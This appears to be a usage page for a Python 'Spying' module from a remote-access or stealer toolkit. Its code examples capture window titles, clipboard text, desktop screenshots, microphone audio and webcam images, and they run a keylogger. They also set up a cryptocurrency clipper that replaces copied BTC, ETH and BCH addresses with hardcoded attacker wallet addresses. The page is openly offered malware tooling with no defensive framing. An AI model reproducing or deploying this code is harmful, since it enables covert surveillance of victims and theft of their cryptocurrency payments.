# Spying functions

``` python
import Spying.ActiveWindow
import Spying.Clipboard
import Spying.Desktop
import Spying.Microphone
import Spying.Webcam
import Spying.Keylogger
import Spying.Clipper

# Get active window title
print("Current active window title is : " + Spying.ActiveWindow.Get())
# Get all open window titles
print(Spying.ActiveWindow.GetAll())

# Get text from clipboard
print("Text in clipboard : " + Spying.Clipboard.Get())
# Set text to clipboard
Spying.Clipboard.Set("Hello world")

# Create desktop screenshot
Spying.Desktop.Screenshot(filename="image.jpg")
# Record audio from microphone
Spying.Microphone.Record(filename="recording.wav", time=40)
# Create webcam screenshot
Spying.Webcam.Screenshot(filename="image.jpg", delay=4500, camera=1)

# Keylogger
logger = Spying.Keylogger.Logger()
logger.Start()
#time.sleep(10)
logger.Stop()
logger.FetchLogs()
logger.CleanLogs()

# Clipper (btc, eth, bch, xmr, xrp, ltc, neo, dash)
# Replace cryptocurrency addresses in clipboard
clipper = Spying.Clipper.Clipper(
	btc="1AzxXLqLABEo5zSQhp1qJVAsx9CYX86vfU",
	eth="0x357C0541F19a7755AFbF1CCD824EE06059404238",
	bch="qphk8ghgspmtmfrqfyalqxj48w9gtazuwuvz3xa26t",
	)
clipper.Start()
#time.sleep(10)
clipper.Stop()
```